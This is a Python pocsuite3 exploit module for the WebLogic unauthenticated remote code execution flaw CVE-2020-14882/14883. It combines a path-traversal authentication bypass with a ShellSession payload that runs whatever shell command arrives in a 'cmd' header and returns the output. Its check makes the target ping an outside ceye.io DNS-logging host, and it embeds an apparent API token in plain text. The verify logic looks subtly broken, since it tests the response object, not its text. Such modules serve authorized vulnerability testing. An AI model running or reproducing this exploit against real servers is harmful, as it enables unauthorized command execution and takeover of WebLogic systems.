#!/usr/bin/env python
# _*_ encoding：utf-8 _*_

from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import requests
from pocsuite3.lib.utils import random_str
import json


class Weblogic(POCBase):
    vulID = ''
    version = '1.0'
    author = ['big04dream']
    vulDate = '2020-10-28'
    createDate = '2020-11-14'
    updateDate = '2020-11-14'
    references = ['']
    name = 'Weblogic未授权命令执行漏洞 (CVE-2020-14882/14883)'
    appPowerLink = 'https://www.oracle.com/security-alerts/cpuoct2020traditional.html'
    appName = 'Weblogic Server'
    appVersion = '10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0'
    vulType = 'rce'
    desc = '''
    Weblogic未授权命令执行漏洞 (CVE-2020-14882/14883)
    '''

    @property
    def _payload(self):
        code = ('_nfpb=true&_pageLabel=&handle='
                                      'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
                                      '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
                                      'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
                                      '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
                                      '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
                                      'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
                                      'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
                                      '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
                                      '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
                                      '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
                                      'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
                                      'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
                                      'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')
        return code

    def _headers(self, cmd):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                      'application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'cmd': cmd
        }
        return headers

    def _verify(self):
        result = {}
        try:
            target = self.url + "/console/css/%252e%252e%252fconsole.portal"
            dns = random_str(16) + '.6eb4yw.ceye.io'
            cmd = 'ping ' + dns
            requests.post(
                target,
                data=self._payload,
                headers=self._headers(cmd),
                timeout=5,
                verify=False
            )
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if dns in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['Payload'] = cmd
        except:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(Weblogic)
